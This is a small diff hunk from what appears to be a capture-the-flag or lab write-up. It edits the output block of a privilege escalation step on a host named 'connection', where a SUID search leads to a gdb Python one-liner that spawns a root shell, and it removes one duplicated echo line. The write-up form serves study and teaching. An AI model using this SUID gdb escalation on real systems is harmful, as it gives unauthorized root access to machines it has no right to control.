@@ -130,7 +130,6 @@ www-data@connection:/home/connection$ find / -perm -4000 -type f -exec ls -la {}
 ```
 www-data@connection:/home/connection$ gdb -q -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
 # whoami;id
-whoami;id
 root
 uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
 ```
